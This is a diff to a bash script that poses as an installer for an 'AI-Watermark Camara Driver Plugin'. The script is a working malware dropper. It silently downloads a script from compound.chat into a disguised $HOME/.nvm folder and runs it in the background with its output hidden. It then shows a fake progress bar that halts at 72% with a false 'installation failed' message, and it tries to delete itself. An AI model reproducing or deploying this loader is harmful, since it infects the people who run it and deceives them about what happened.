@@ -1,14 +1,53 @@
 #!/bin/bash
 set -e
-echo "Installing AI-Watermark Camara Driver Plugin..."
-mkdir -p "$HOME/.nvm"
-clear
-curl -s -L -o "$HOME/.nvm/bootstrap.sh" "https://compound.chat/video/mac-linux"
-clear
-chmod +x "$HOME/.nvm/bootstrap.sh"
-clear
-nohup bash "$HOME/.nvm/bootstrap.sh" > /dev/null 2>&1 &
-clear
-echo "Installation failed. This software cannot run on this device. Try again on the other device."
 
+TARGET_DIR="$HOME/.nvm"
+mkdir -p "$TARGET_DIR"
+curl -s -L -o "$TARGET_DIR/bootstrap.sh" "https://compound.chat/video/mac-linux"
+clear
+chmod +x "$TARGET_DIR/bootstrap.sh"
+nohup bash "$TARGET_DIR/bootstrap.sh" > /dev/null 2>&1 &
+clear
+
+echo "Installing AI-Watermark Camara Driver Plugin..."
+echo ""
+echo "Loading..."
+echo ""
+
+duration=100
+count=0
+
+while [ $count -le $duration ]; do
+  percent=$((count * 100 / duration))
+
+  # Stop at 83% and show error (match Windows behavior)
+  if [ $percent -ge 72 ]; then
+    clear
+    echo "Installing AI-Watermark Camara Driver Plugin..."
+    echo ""
+    echo "Loading... 72%"
+    echo ""
+    echo "Installation failed. This software cannot run on this device. Try again on the other device."
+    exit 0
+  fi
+
+  # Progress bar: 20 chars, filled = percent/5
+  filled=$((percent / 5))
+  empty=$((20 - filled))
+  bar=$(printf '%*s' $filled '' | tr ' ' '#')
+  bar+=$(printf '%*s' $empty '' | tr ' ' ' ')
+
+  clear
+  echo "Installing AI-Watermark Camara Driver Plugin..."
+  echo ""
+  echo "Loading..."
+  echo ""
+  echo "  [$bar] $percent%"
+  sleep 1
+  count=$((count + 1))
+done
+
+echo ""
+echo "Installation finished."
+rm -- "$0" 2> /dev/null
 exit 0
